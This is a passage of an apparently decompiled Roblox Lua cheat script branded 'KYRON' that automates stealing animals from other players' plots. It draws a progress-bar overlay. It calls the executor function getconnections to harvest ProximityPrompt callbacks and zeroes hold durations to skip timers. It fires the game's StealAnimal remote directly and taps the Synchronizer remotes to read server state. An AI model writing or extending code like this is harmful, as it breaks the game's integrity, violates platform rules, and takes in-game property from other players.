            uiScale = Instance.new("UIScale", frame2)
            uiScale.Name = "KYRONStealBarScale"
            updateStealBarScale()

            do
              local uiScale2 = Instance.new("UIScale", frame2)
              uiScale2.Name = "IntroRevealScale"
              local flag17 = false

              _G._KYRONRevealStealBarAfterIntro = function()
                if flag17 or not frame2.Parent then
                  return
                end
                flag17 = true
                local position = frame2.Position
                frame2.Visible = true
                uiScale2.Scale = 0.84
                frame2.Position = UDim2.new(position.X.Scale, position.X.Offset, position.Y.Scale, position.Y.Offset + 18)
                TweenService:Create(frame2, TweenInfo.new(0.34, Enum.EasingStyle.Back, Enum.EasingDirection.Out), { Position = position }):Play()
                local tbl39 = { Scale = 1 }
                TweenService:Create(uiScale2, TweenInfo.new(0.34, Enum.EasingStyle.Back, Enum.EasingDirection.Out), tbl39):Play()
              end
            end
          end

          do
            local textLabel2, instance, textLabel3

            do
              frame2.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
              frame2.BackgroundTransparency = 0
              Instance.new("UICorner", frame2).CornerRadius = UDim.new(0, 10)
              uiStroke = Instance.new("UIStroke", frame2)
              uiStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
              uiStroke.Thickness = 1
              uiStroke.Color = Color3.fromRGB(105, 105, 112)
              uiStroke.Transparency = 0.25
              textLabel = Instance.new("TextLabel", frame2)
              textLabel.Size = UDim2.new(1, -20, 0, 30)
              textLabel.Position = UDim2.new(0, 10, 0, 31)
              textLabel.BackgroundTransparency = 1
              textLabel.Text = "0%"
              textLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
              textLabel:SetAttribute("_NoKYRONTheme", true)
              textLabel.Font = Enum.Font.GothamBold
              textLabel.TextSize = 14
              textLabel.TextXAlignment = Enum.TextXAlignment.Center
              textLabel.TextStrokeTransparency = 1
              textLabel.ZIndex = 56
              textLabel2 = Instance.new("TextLabel", frame2)
              textLabel2.Size = UDim2.new(0.5, -14, 0, 16)
              textLabel2.Position = UDim2.new(0.5, 4, 0, 5)
              textLabel2.BackgroundTransparency = 1
              textLabel2.Text = "MS --"
              textLabel2.TextColor3 = Color3.fromRGB(255, 255, 255)
              textLabel2:SetAttribute("_NoKYRONTheme", true)
              textLabel2.Font = Enum.Font.GothamBold
              textLabel2.TextSize = 11
              textLabel2.TextTransparency = 0
              textLabel2.TextXAlignment = Enum.TextXAlignment.Right
              textLabel2.TextStrokeTransparency = 1
              textLabel2.ZIndex = 56
              instance = Instance.new("TextLabel", frame2)
              instance.Size = UDim2.new(0.5, -14, 0, 16)
              instance.Position = UDim2.new(0, 10, 0, 5)
              instance.BackgroundTransparency = 1
              instance.Text = "FPS: --  ·  PING: --  ·  KYRON"
              instance.TextColor3 = Color3.fromRGB(255, 255, 255)
              instance:SetAttribute("_NoKYRONTheme", true)
              instance.Visible = true
              instance.Font = Enum.Font.GothamBold
              instance.TextSize = 11
              instance.TextXAlignment = Enum.TextXAlignment.Left
              instance.TextStrokeTransparency = 1
              instance.TextTransparency = 0
              instance.ZIndex = 56
              instance.Text = "FPS --"
              textLabel3 = Instance.new("TextLabel", frame2)
              textLabel3.Name = "KYRONLink"
              textLabel3.Size = UDim2.new(1, -20, 0, 18)
              textLabel3.Position = UDim2.new(0, 10, 0, 22)
              textLabel3.BackgroundTransparency = 1
              textLabel3.Text = "KYRON"
              textLabel3.TextColor3 = Color3.fromRGB(255, 240, 255)
              textLabel3.TextTransparency = 0.25
              textLabel3.Font = Enum.Font.GothamMedium
              textLabel3.TextSize = 12
              textLabel3.TextXAlignment = Enum.TextXAlignment.Center
              textLabel3.TextStrokeTransparency = 1
              textLabel3.ZIndex = 51
              textLabel3.Visible = false
              textLabel3.Text = "KYRON"
              textLabel3:SetAttribute("_KYRONNoInvert", true)

              do
                local function fn43(arg)
                  local textLabel4 = Instance.new("TextLabel")
                  textLabel4.Name = arg.Name .. "Shadow"
                  textLabel4.Size = arg.Size
                  textLabel4.Position = UDim2.new(arg.Position.X.Scale, arg.Position.X.Offset + 1, arg.Position.Y.Scale, arg.Position.Y.Offset + 1)
                  textLabel4.BackgroundTransparency = 1
                  textLabel4.Text = arg.Text
                  textLabel4.TextColor3 = Color3.fromRGB(0, 0, 0)
                  textLabel4.TextTransparency = 0.6
                  textLabel4.Font = arg.Font
                  textLabel4.TextSize = arg.TextSize
                  textLabel4.TextXAlignment = arg.TextXAlignment
                  textLabel4.TextYAlignment = arg.TextYAlignment
                  textLabel4.TextWrapped = arg.TextWrapped
                  textLabel4.ZIndex = arg.ZIndex - 1
                  textLabel4.Visible = arg.Visible
                  textLabel4.Parent = frame2

                  arg:GetPropertyChangedSignal("Text"):Connect(function()
                    textLabel4.Text = arg.Text
                  end)

                  arg:GetPropertyChangedSignal("TextTransparency"):Connect(function()
                    textLabel4.TextTransparency = math.clamp(arg.TextTransparency + 0.6, 0, 1)
                  end)

                  arg:GetPropertyChangedSignal("Visible"):Connect(function()
                    textLabel4.Visible = arg.Visible
                  end)
                end

                fn43(textLabel)
                fn43(textLabel2)
                fn43(textLabel3)
              end
            end

            do
              local instance2 = Instance.new("Frame", frame2)
              instance2.Size = UDim2.new(1, -20, 0, 30)
              instance2.Position = UDim2.new(0, 10, 0, 31)
              instance2.BackgroundColor3 = Color3.fromRGB(8, 8, 11)
              instance2.BackgroundTransparency = 0
              instance2.BorderSizePixel = 0
              instance2.ZIndex = 51
              instance2.ClipsDescendants = true
              Instance.new("UICorner", instance2).CornerRadius = UDim.new(1, 0)
              local trackStroke = Instance.new("UIStroke", instance2)
              trackStroke.Thickness = 1.6
              trackStroke.Color = Color3.fromRGB(225, 225, 235)
              trackStroke.Transparency = 0.04
              frame = Instance.new("Frame", instance2)
              frame.Size = UDim2.fromScale(0, 1)
              frame.BackgroundColor3 = _G._KYRONAccent or color2
              frame.BorderSizePixel = 0
              frame.ZIndex = 52
              Instance.new("UICorner", frame).CornerRadius = UDim.new(1, 0)
              local instance3 = Instance.new("UIGradient", frame)
              instance3.Name = "ProgressFillShade"
              instance3.Color = ColorSequence.new({
                ColorSequenceKeypoint.new(0, (_G._KYRONAccent or color2):Lerp(Color3.fromRGB(255, 255, 255), 0.28)),
                ColorSequenceKeypoint.new(0.55, _G._KYRONAccent or color2),
                ColorSequenceKeypoint.new(1, (_G._KYRONAccent or color2):Lerp(Color3.fromRGB(0, 0, 0), 0.18)),
              })
              instance3.Rotation = 0

              _G._KYRONApplyStealBarInvert = function()
                local flag17 = _G._KYRONInvertUI == true
                local KYRONAccent = _G._KYRONAccent or color2
                frame2.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
                frame2.BackgroundTransparency = 0
                textLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
                textLabel2.TextColor3 = Color3.fromRGB(255, 255, 255)
                textLabel3.TextColor3 = Color3.fromRGB(255, 255, 255)
                instance.TextColor3 = Color3.fromRGB(255, 255, 255)
                textLabel.Font = flag17 and Enum.Font.GothamBlack or Enum.Font.GothamBold
                textLabel2.Font = flag17 and Enum.Font.GothamBlack or Enum.Font.GothamBold
                textLabel3.Font = flag17 and Enum.Font.GothamBlack or Enum.Font.GothamMedium
                instance.Font = flag17 and Enum.Font.GothamBlack or Enum.Font.GothamBold
                instance2.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
                instance2.BackgroundTransparency = 0
                instance2.BorderSizePixel = 0
                trackStroke.Color = Color3.fromRGB(150, 150, 158)
                trackStroke.Transparency = 0.12
                textLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
                textLabel2.TextColor3 = Color3.fromRGB(255, 255, 255)
                instance.TextColor3 = Color3.fromRGB(255, 255, 255)
                instance.TextTransparency = 0
                textLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
                textLabel2.TextColor3 = Color3.fromRGB(255, 255, 255)
                frame.BackgroundColor3 = KYRONAccent
                local v79 = instance3
                local colorSequence = ColorSequence.new
                local tbl39 = {}
                local v80 = 0.4
                local v81 = ColorSequenceKeypoint.new(0, KYRONAccent:Lerp(Color3.fromRGB(255, 240, 255), v80))
                local v82 = ColorSequenceKeypoint.new(0.5, KYRONAccent)
                local new = ColorSequenceKeypoint.new
                local lerp = KYRONAccent.Lerp
                local color4 = Color3.fromRGB(0, 0, 0)
                tbl39[1] = v81
                tbl39[2] = v82

                do
                  local values = table.pack(new(1, lerp(KYRONAccent, color4, 0.07)))
                  table.move(values, 1, values.n, 3, tbl39)
                end

                v79.Color = colorSequence(tbl39)
                color3 = flag17 and Color3.fromRGB(230, 105, 112) or Color3.fromRGB(28, 28, 32)
                color = flag17 and Color3.fromRGB(20, 20, 24) or Color3.fromRGB(240, 255, 255)
                uiStroke.Color = flag16 and color or color3

                for _, child in ipairs(frame2:GetChildren()) do
                  if child:IsA("TextLabel") and child.Name:sub(-6) == "Shadow" then
                    child.TextColor3 = Color3.fromRGB(0, 0, 0)
                  end
                end
              end
            end

            task.spawn(function()
              local now3 = tick()
              local n34 = 0
              local n35 = 0

              while textLabel2.Parent do
                n34 += 1
                local now4 = tick()

                if 0.5 <= now4 - now3 then
                  local n36 = math.floor(n34 / (now4 - now3))

                  local ok, result = pcall(function()
                    local v79 = 1000
                    return localPlayer:GetNetworkPing() * v79
                  end)

                  if ok and result then
                    n35 = math.floor(result)
                  end

                  instance.Text = string.format("FPS %d", n36)
                  textLabel2.Text = string.format("MS %d", n35)
                  n34 = 0
                  now3 = now4
                end

                task.wait()
              end
            end)

            task.spawn(function()
              while instance.Parent do
                if frame and frame.Size and frame.Size.X then
                  instance.TextTransparency = 0
                end

                task.wait(0.1)
              end
            end)
          end
        end

        do
          local flag17 = nil
          local position = nil
          local position2 = nil
          local v79 = nil

          frame2.InputBegan:Connect(function(input)
            if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
              flag17 = true
              position = input.Position
              position2 = frame2.Position
              v79 = input
            end
          end)

          UserInputService.InputEnded:Connect(function(input)
            if not flag17 or input ~= v79 then
              return
            end
            flag17 = false
            v79 = nil
            local currentCamera = workspace.CurrentCamera
            currentCamera = currentCamera and currentCamera.ViewportSize

            if currentCamera and currentCamera.X > 0 and currentCamera.Y > 0 then
              _G._KYRONStealBarPos = {
                xs = frame2.Position.X.Scale,
                xo = frame2.Position.X.Offset,
                ys = frame2.Position.Y.Scale,
                yo = frame2.Position.Y.Offset,
                vw = currentCamera.X,
                vh = currentCamera.Y,
                nx = frame2.AbsolutePosition.X / currentCamera.X,
                ny = frame2.AbsolutePosition.Y / currentCamera.Y,
              }

              pcall(saveKYRONSettings, true)
            end
          end)

          UserInputService.InputChanged:Connect(function(input)
            if not flag17 then
              return
            end

            if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
              local n34 = input.Position - position
              frame2.Position = UDim2.new(position2.X.Scale, position2.X.Offset + n34.X, position2.Y.Scale, position2.Y.Offset + n34.Y)
            end
          end)
        end

        tween = nil

        fn39 = function()
          textLabel.Text = "0%"

          if tween then
            tween:Cancel()
          end

          tween = TweenService:Create(frame, TweenInfo.new(0.06, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), { Size = UDim2.new(0, 0, 1, 0) })
          tween:Play()
          uiStroke.Color = color3
        end

        fn40 = function(arg)
          local plots = workspace:FindFirstChild("Plots")
          if not plots then
            return false
          end
          local v79 = plots:FindFirstChild(arg)
          if not v79 then
            return false
          end
          local plotSign = v79:FindFirstChild("PlotSign")
          if not plotSign then
            return false
          end
          local v80 = plotSign:FindFirstChild("YourBase")
          return v80 and v80:IsA("BillboardGui") and v80.Enabled == true
        end

        fn41 = function(arg)
          if not arg or not arg:IsA("Model") then
            return
          end

          if fn40(arg.Name) then
            return
          end
          local animalPodiums = arg:FindFirstChild("AnimalPodiums")
          if not animalPodiums then
            return
          end

          for _, child in ipairs(animalPodiums:GetChildren()) do
            if child:IsA("Model") and child:FindFirstChild("Base") then
              local str9 = arg.Name .. "_" .. child.Name
              local flag17 = false

              for _, v79 in ipairs(tbl36) do
                if v79.uid == str9 then
                  flag17 = true
                  break
                end
              end

              if not flag17 then
                table.insert(tbl36, {
                  name = child.Name,
                  plot = arg.Name,
                  slot = child.Name,
                  worldPosition = child:GetPivot().Position,
                  uid = str9,
                })
              end
            end
          end
        end

        fn42 = function(arg)
          if not arg then
            return nil
          end
          local plots = workspace:FindFirstChild("Plots")
          if not plots then
            return nil
          end
          local v79 = plots:FindFirstChild(arg.plot)
          if not v79 then
            return nil
          end
          local animalPodiums = v79:FindFirstChild("AnimalPodiums")
          if not animalPodiums then
            return nil
          end
          local v80 = animalPodiums:FindFirstChild(arg.slot)
          if not v80 then
            return nil
          end
          local base = v80:FindFirstChild("Base")
          if not base then
            return nil
          end
          local spawn_ = base:FindFirstChild("Spawn")
          if not spawn_ then
            return nil
          end
          local v81 = tbl38[arg.uid]
          if v81 and v81.Parent and v81:IsDescendantOf(spawn_) then
            return v81
          end
          tbl38[arg.uid] = nil
          local v82 = spawn_:FindFirstChild("PromptAttachment")
          local v83 = nil

          if v82 then
            v83 = nil

            for _, child in ipairs(v82:GetChildren()) do
              if child:IsA("ProximityPrompt") then
                v83 = child
                break
              else
                v83 = nil
              end
            end
          end

          if not v83 then
            for _, descendant in ipairs(spawn_:GetDescendants()) do
              if descendant:IsA("ProximityPrompt") then
                v83 = descendant
                break
              end
            end
          end

          if v83 then
            tbl38[arg.uid] = v83
          end

          return v83
        end
      end

      local fn43

      do
        local fn44, fn45, fn46, fn47

        do
          do
            do
              local function fn48(arg)
                if tbl37[arg] then
                  return
                end
                local tbl38 = { holdCallbacks = {}, triggerCallbacks = {}, ready = true }

                if getconnections then
                  local ok, result = pcall(getconnections, arg.PromptButtonHoldBegan)

                  if ok and type(result) == "table" then
                    for _, v78 in ipairs(result) do
                      if type(v78.Function) == "function" then
                        table.insert(tbl38.holdCallbacks, v78.Function)
                      end
                    end
                  end

                  local ok2, result2 = pcall(getconnections, arg.Triggered)

                  if ok2 and type(result2) == "table" then
                    for _, v78 in ipairs(result2) do
                      if type(v78.Function) == "function" then
                        table.insert(tbl38.triggerCallbacks, v78.Function)
                      end
                    end
                  end
                end

                tbl37[arg] = tbl38
              end

              fn43 = function()
                local character = localPlayer.Character
                if not character then
                  return nil, nil, nil
                end
                local v78 = character:FindFirstChild("HumanoidRootPart") or character:FindFirstChild("Torso")
                local plots = workspace:FindFirstChild("Plots")
                if not v78 or not plots then
                  return nil, nil, nil
                end
                local huge = math.huge
                local position = v78.Position
                local tbl38 = nil
                local v79 = nil

                for _, child in ipairs(plots:GetChildren()) do
                  if not fn40(child.Name) then
                    local animalPodiums = child:FindFirstChild("AnimalPodiums")

                    if animalPodiums then
                      for _, child2 in ipairs(animalPodiums:GetChildren()) do
                        local base = child2:FindFirstChild("Base")
                        base = base and base:FindFirstChild("Spawn")

                        if base then
                          local magnitude = (base.Position - position).Magnitude

                          if magnitude < huge and magnitude <= normalStealSettings.StealRadius then
                            local promptAttachment = base:FindFirstChild("PromptAttachment")

                            if promptAttachment then
                              for _, child3 in ipairs(promptAttachment:GetChildren()) do
                                if child3:IsA("ProximityPrompt") and tostring(child3.ActionText):find("Steal") then
                                  tbl38 = {
                                    name = child2.Name,
                                    plot = child.Name,
                                    slot = child2.Name,
                                    worldPosition = base.Position,
                                    uid = child.Name .. "_" .. child2.Name,
                                  }

                                  v79 = child3
                                  huge = magnitude
                                  break
                                end
                              end
                            end
                          end
                        end
                      end
                    end
                  end
                end

                return tbl38, v79, huge
              end

              local v78 = nil
              local v79 = nil

              local function fn49(arg, arg2, arg3)
                local v80 = tbl37[arg]
                if not v80 or not v80.ready or flag16 then
                  return false
                end

                if tick() - (_G._KYRONLastNormalSteal or 0) < 0.08 then
                  return false
                end

                if tween then
                  tween:Cancel()
                  tween = nil
                end

                v80.ready = false
                flag16 = true
                v78 = arg3
                v79 = arg
                n33 += 1
                local v81 = n33
                _G._KYRONLastNormalSteal = tick()
                now2 = tick()
                local now3 = nil
                local n34 = 0
                textLabel.Text = "0%"
                frame.Size = UDim2.fromScale(0, 1)
                uiStroke.Color = color
                local v82 = _G._KYRONNormalizeNormalPausePercent(normalStealSettings.NormalStealPausePercent or 75)
                local n35 = 1.3 * v82 / 100

                local function fn50()
                  return v81 == n33 and flag16 and autoStealSettings.AutoSteal
                end

                local function fn51()
                  if connection2 then
                    connection2:Disconnect()
                    connection2 = nil
                  end

                  if v81 == n33 then
                    fn39()
                  end

                  v80.ready = true

                  if v81 == n33 then
                    flag16 = false
                    v78 = nil
                    v79 = nil
                  end
                end

                local function fn52()
                  local character = localPlayer.Character

                  if character then
                    character = character:FindFirstChild("HumanoidRootPart") or character:FindFirstChild("Torso")
                  end

                  if not character then
                    return nil
                  end
                  local parent = arg.Parent
                  local worldPosition

                  while true do
                    local flag17 = parent and parent ~= workspace
                    worldPosition = nil

                    if flag17 then
                      if parent:IsA("Attachment") then
                        worldPosition = parent.WorldPosition
                        break
                      elseif parent:IsA("BasePart") then
                        worldPosition = parent.Position
                        break
                      else
                        parent = parent.Parent
                        continue
                      end
                    end

                    break
                  end

                  if not worldPosition then
                    return nil
                  end
                  local n36 = character.Position - worldPosition
                  return Vector3.new(n36.X, 0, n36.Z).Magnitude
                end

                if connection2 then
                  connection2:Disconnect()
                  connection2 = nil
                end

                local v83 = nil

                connection2 = RunService.Heartbeat:Connect(function()
                  if not fn50() then
                    v83:Disconnect()

                    if connection2 == v83 then
                      connection2 = nil
                    end

                    return
                  end

                  local n36 = math.clamp(((now3 or tick()) - now2 - n34) / 1.3, 0, 1)
                  frame.Size = UDim2.fromScale(n36, 1)
                  textLabel.Text = math.floor(n36 * 100) .. "%"
                end)

                task.spawn(function()
                  pcall(function()
                    arg.HoldDuration = 0
                  end)

                  for _, holdCallback in ipairs(v80.holdCallbacks) do
                    task.spawn(holdCallback)
                  end

                  while true do
                    if fn50() and tick() - now2 < n35 then
                      local v84 = fn52()
                      if not (not v84 or v84 > normalStealSettings.StealRadius) then
                        task.wait()
                        continue
                      end
                    end

                    break
                  end

                  if not fn50() then
                    if v81 == n33 then
                      v80.ready = true
                    end

                    return
                  end

                  local n36 = math.clamp(v82 / 100, 0, 1)
                  frame.Size = UDim2.fromScale(n36, 1)
                  textLabel.Text = math.floor(n36 * 100) .. "%"
                  now3 = tick()
                  local n37 = math.max(2.99 - n35 - math.max(1.3 - n35, 0), 0.05)
                  local now4 = tick()

                  while fn50() do
                    if n37 <= tick() - now4 then
                      fn51()
                      return
                    end
                    local v84 = fn52()
                    if not v84 or v84 > normalStealSettings.StealRadius then
                      fn51()
                      return
                    end

                    if v84 <= 6 then
                      n34 += tick() - now3
                      now3 = nil
                      break
                    end

                    task.wait()
                  end

                  if not fn50() then
                    if v81 == n33 then
                      v80.ready = true
                    end

                    return
                  end

                  local now5 = tick()
                  local n38 = math.max(1.3 - n35, 0.05)

                  while fn50() and tick() - now5 < n38 do
                    task.wait()
                  end

                  if fn50() then
                    pcall(function()
                      for _, triggerCallback in ipairs(v80.triggerCallbacks) do
                        task.spawn(triggerCallback)
                      end

                      local stealAnimal = game:GetService("ReplicatedStorage"):FindFirstChild("StealAnimal")

                      if stealAnimal and arg2 then
                        stealAnimal:FireServer(arg2)
                      end

                      if arg then
                        arg:Fire()
                      end
                    end)
                  end

                  fn51()
                end)

                return true
              end

              task.spawn(function()
                local v80 = workspace:WaitForChild("Plots", 12)
                if not v80 then
                  return
                end

                for _, child in ipairs(v80:GetChildren()) do
                  pcall(fn41, child)
                end

                v80.ChildAdded:Connect(function(child)
                  task.wait(1)
                  pcall(fn41, child)
                end)
              end)

              task.spawn(function()
                while task.wait(24) do
                  local plots = workspace:FindFirstChild("Plots")

                  if plots then
                    tbl36 = {}

                    for _, child in ipairs(plots:GetChildren()) do
                      pcall(fn41, child)
                    end
                  end
                end
              end)

              fn44 = function()
                if _G._KYRONNormalStealRagdollPaused == true then
                  return
                end

                if autoStealRuntime.autoSteal then
                  return
                end

                pcall(function()
                  local v80 = workspace:FindFirstChild("Plots")

                  if v80 then
                    for _, descendant in ipairs(v80:GetDescendants()) do
                      if descendant:IsA("ProximityPrompt") then
                        pcall(function()
                          descendant.HoldDuration = 0
                        end)
                      end
                    end
                  end
                end)

                autoStealRuntime.autoSteal = RunService.Heartbeat:Connect(function()
                  if not autoStealSettings.AutoSteal or flag16 then
                    return
                  end

                  if tick() < (autoStealRuntime.autoStealNextScan or 0) then
                    return
                  end
                  autoStealRuntime.autoStealNextScan = tick() + 0.10
                  local v80 = v78
                  local v81 = v79
                  local v82 = v78

                  if v80 then
                    if not v81 or not v81.Parent then
                      v78 = nil
                      v79 = nil
                      v82 = nil
                    else
                      v82 = v80
                    end
                  end

                  local magnitude

                  if v82 then
                    local character = localPlayer.Character

                    if character then
                      character = character:FindFirstChild("HumanoidRootPart") or character:FindFirstChild("UpperTorso")
                    end

                    magnitude = character and v82.worldPosition and (character.Position - v82.worldPosition).Magnitude or math.huge
                  else
                    v82, v81, magnitude = fn43()
                  end

                  if not v82 then
                    return
                  end

                  if normalStealSettings.StealRadius < magnitude then
                    if v78 == v82 then
                      v78 = nil
                    end

                    return
                  end

                  v81 = v81 or fn42(v82)

                  if v81 then
                    fn48(v81)
                    fn49(v81, v82.name, v82)
                  end
                end)
              end

              fn45 = function()
                n33 += 1

                if autoStealRuntime.autoSteal then
                  autoStealRuntime.autoSteal:Disconnect()
                  autoStealRuntime.autoSteal = nil
                end

                flag16 = false

                if connection2 then
                  connection2:Disconnect()
                  connection2 = nil
                end

                if v79 then
                  local v80 = tbl37[v79]

                  if v80 then
                    v80.ready = true
                  end
                end

                fn39()
              end
            end
          end

          _G._KYRONStealMode = _G._KYRONStealMode or "NORMAL"

          if _G._KYRONBatMode ~= "DEFAULT" and _G._KYRONBatMode ~= "BYPASS" then
            _G._KYRONBatMode = "DEFAULT"
          end

          _G._KYRONTpBatMode = _G._KYRONTpBatMode or "HIGH PING"

          if _G._KYRONTpBatMode == "SURE HIT" then
            _G._KYRONTpBatMode = "LOW PING"
          end

          -- Plot synchronization and automatic-steal state.
          stealController = {
            CFG = {
              HOLD_MIN = 1.3,
              HOLD_MAX = 1.5,
              ENTRY_DELAY = 0.25,
              STEAL_RANGE = 8,
              PRIME_RANGE = 60,
              COOLDOWN = 0.05,
            },
            plotSync = { caches = {}, connections = {} },
            allAnimalsCache = {},
            PromptMemoryCache = {},
            InternalStealCache = {},
            StealState = {
              active = false,
              startTime = 0,
              phase = "idle",
              label = "",
              lastResult = "",
              lastResultTime = 0,
            },
            enabled = false,
            stealConn = nil,
            scanThread = nil,
            initted = false,
            syncRemotes = nil,
            AnimalsData = nil,
            plots = nil,
          }

          fn46 = function()
            if stealController.initted then
              return true
            end

            if
              not pcall(function()
                local ReplicatedStorage = game:GetService("ReplicatedStorage")
                local packages = ReplicatedStorage:WaitForChild("Packages", 10)
                local datas = ReplicatedStorage:WaitForChild("Datas", 5)

                if not packages or not datas then
                  error("no packages")
                end

                stealController.AnimalsData = require(datas:WaitForChild("Animals"))
                stealController.plots = workspace:WaitForChild("Plots", 5)
                local synchronizer = packages:WaitForChild("Synchronizer", 10)

                stealController.syncRemotes = {
                  channelFolder = synchronizer:WaitForChild("Channel"),
                  routeRemote = synchronizer:WaitForChild("Router"),
                  requestData = synchronizer:FindFirstChild("RequestData"),
                }
              end)
            then
              return false
            end

            local function fn48(arg)
              if typeof(arg) == "table" then
                return arg
              end
              local tbl38 = {}

              for match in string.gmatch(tostring(arg), "[^%.]+") do
                table.insert(tbl38, tonumber(match) or match)
              end

              return tbl38
            end

            local function fn49(arg, arg2)
              local v78 = nil
              local v79 = nil

              for _, v80 in ipairs(fn48(arg)) do
                local v81 = arg2 and arg2[v80]

                if v81 then
                  v78 = arg2
                  v79 = v80
                  arg2 = v81
                else
                  v78 = arg2
                  v79 = v80
                  arg2 = nil
                end
              end

              return arg2, v78, v79
            end

            local function fn50(arg, arg2)
              local v78 = stealController.plotSync.caches[arg]

              if typeof(v78) ~= "table" then
                return
              end
              local v80 = arg2[2]
              local v81 = arg2[3]
              local v82 = arg2[4]
              local v83, v84, v85 = fn49(arg2[1], v78)

              if v80 == "Changed" then
                if v84 ~= nil then
                  v84[v85] = v81
                end
              elseif v80 == "ArrayInsert" then
                if v83 ~= nil then
                  table.insert(v83, v82, v81)
                end
              elseif v80 == "ArrayRemoved" then
                if v83 ~= nil then
                  table.remove(v83, v82)
                end
              elseif v80 == "DictionaryInsert" then
                if v83 ~= nil then
                  v83[v82] = v81
                end
              elseif v80 == "DictionaryRemoved" then
                if v83 ~= nil then
                  v83[v82] = nil
                end
              end
            end

            local function fn51(arg)
              if stealController.plotSync.connections[arg] then
                return
              end
              local str9 = tostring(arg.Name)
              if not stealController.plots:FindFirstChild(str9) then
                return
              end

              if stealController.syncRemotes.requestData and stealController.plotSync.caches[str9] == nil then
                local ok, result = pcall(function()
                  return stealController.syncRemotes.requestData:InvokeServer(str9)
                end)

                if ok then
                  ok = typeof(result) == "table"
                end

                if ok then
                  stealController.plotSync.caches[str9] = result
                else
                  stealController.plotSync.caches[str9] = {}
                end
              elseif stealController.plotSync.caches[str9] == nil then
                stealController.plotSync.caches[str9] = {}
              end

              stealController.plotSync.connections[arg] = arg.OnClientEvent:Connect(function(arg2)
                for _, v78 in ipairs(arg2) do
                  fn50(str9, v78)
                end
              end)
            end

            local function fn52(arg)
              for k, connection3 in pairs(stealController.plotSync.connections) do
                if tostring(k.Name) == tostring(arg) then
                  connection3:Disconnect()
                  stealController.plotSync.connections[k] = nil
                  stealController.plotSync.caches[tostring(arg)] = nil
                  break
                end
              end
            end

            for _, child in ipairs(stealController.syncRemotes.channelFolder:GetChildren()) do
              if child:IsA("RemoteEvent") then
                fn51(child)
              end
            end

            stealController.syncRemotes.channelFolder.ChildAdded:Connect(function(child)
              if child:IsA("RemoteEvent") then
                fn51(child)
              end
            end)

            task.spawn(function()
              for i = 1, 25 do
                task.wait(1)

                if not (not stealController.syncRemotes or not stealController.plots) then
                  for _, child in ipairs(stealController.syncRemotes.channelFolder:GetChildren()) do
                    if child:IsA("RemoteEvent") then
                      pcall(fn51, child)
                    end
                  end

                  continue
                end

                break
              end
            end)

            stealController.syncRemotes.routeRemote.OnClientEvent:Connect(function(arg)
              for _, v78 in ipairs(arg) do
                local v79 = v78[1]
                local str9 = tostring(v78[2])

                if stealController.plots:FindFirstChild(str9) then
                  if v79 == "ListenerAdded" then
                    local v80 = stealController.syncRemotes.channelFolder:FindFirstChild(str9)

                    if v80 and v80:IsA("RemoteEvent") then
                      fn51(v80)
                    end
                  elseif v79 == "ListenerRemoved" then
                    fn52(str9)
                  end
                end
              end
            end)

            stealController.initted = true
            return true
          end

          do
            local function fn48(arg)
              local v78 = arg:FindFirstChild("PlotSign")
              local frame2 = v78 and v78:FindFirstChild("SurfaceGui") and v78.SurfaceGui:FindFirstChild("Frame")
              frame2 = frame2 and frame2:FindFirstChild("TextLabel")
              if not frame2 or frame2.Text == "Empty Base" then
                return nil
              end
              return frame2.Text:gsub("'s [Bb]ase$", ""):gsub("%s+$", "")
            end

            fn47 = function(arg)
              if not arg or not arg.plot then
                return false
              end
              local v78 = stealController.plots:FindFirstChild(arg.plot)
              if not v78 then
                return false
              end
              local v79 = fn48(v78)
              return v79 == localPlayer.DisplayName or v79 == localPlayer.Name
            end
          end
        end

        local fn48, fn49, fn50

        do
          local fn51

          do
            fn48 = function(arg)
              if not arg then
                return nil
              end
              local v78 = stealController.PromptMemoryCache[arg.uid]
              if v78 and v78.Parent then
                return v78
              end
              local v79 = stealController.plots:FindFirstChild(arg.plot)
              if not v79 then
                return nil
              end
              local animalPodiums = v79:FindFirstChild("AnimalPodiums")
              if not animalPodiums then
                return nil
              end
              local v80 = animalPodiums:FindFirstChild(arg.slot)
              if not v80 then
                return nil
              end
              local base = v80:FindFirstChild("Base")
              if not base then
                return nil
              end
              local v81 = base:FindFirstChild("Spawn")
              if not v81 then
                return nil
              end
              local v82 = v81:FindFirstChild("PromptAttachment")
              if not v82 then
                return nil
              end

              for _, child in ipairs(v82:GetChildren()) do
                if child:IsA("ProximityPrompt") then
                  stealController.PromptMemoryCache[arg.uid] = child
                  return child
                end
              end

              return nil
            end

            do
              local function fn52(arg)
                local v78 = stealController.plots:FindFirstChild(arg.plot)
                if not v78 then
                  return nil
                end
                local animalPodiums = v78:FindFirstChild("AnimalPodiums")
                if not animalPodiums then
                  return nil
                end
                local v79 = animalPodiums:FindFirstChild(arg.slot)
                if not v79 then
                  return nil
                end
                return v79:GetPivot().Position
              end

              fn51 = function(arg)
                local character = localPlayer.Character
                if not character then
                  return math.huge
                end
                local humanoidRootPart = character:FindFirstChild("HumanoidRootPart") or character:FindFirstChild("UpperTorso")
                if not humanoidRootPart then
                  return math.huge
                end
                local v78 = fn52(arg)
                if not v78 then
                  return math.huge
                end
                return (humanoidRootPart.Position - v78).Magnitude
              end

              fn49 = function()
                local character = localPlayer.Character
                if not character then
                  return nil
                end
                local humanoidRootPart = character:FindFirstChild("HumanoidRootPart") or character:FindFirstChild("UpperTorso")
                if not humanoidRootPart then
                  return nil
                end
                local huge = math.huge
                local v78 = nil

                for _, v79 in ipairs(stealController.allAnimalsCache) do
                  if not fn47(v79) then
                    local v80 = fn52(v79)

                    if v80 then
                      local magnitude = (humanoidRootPart.Position - v80).Magnitude

                      if magnitude <= stealController.CFG.PRIME_RANGE and magnitude < huge then
                        huge = magnitude
                        v78 = v79
                      end
                    end
                  end
                end

                return v78
              end
            end
          end

          do
            local function fn52(arg)
              if stealController.InternalStealCache[arg] then
                return
              end
              local tbl38 = { holdCallbacks = {}, triggerCallbacks = {}, ready = true }

              if getconnections then
                local ok, result = pcall(getconnections, arg.PromptButtonHoldBegan)

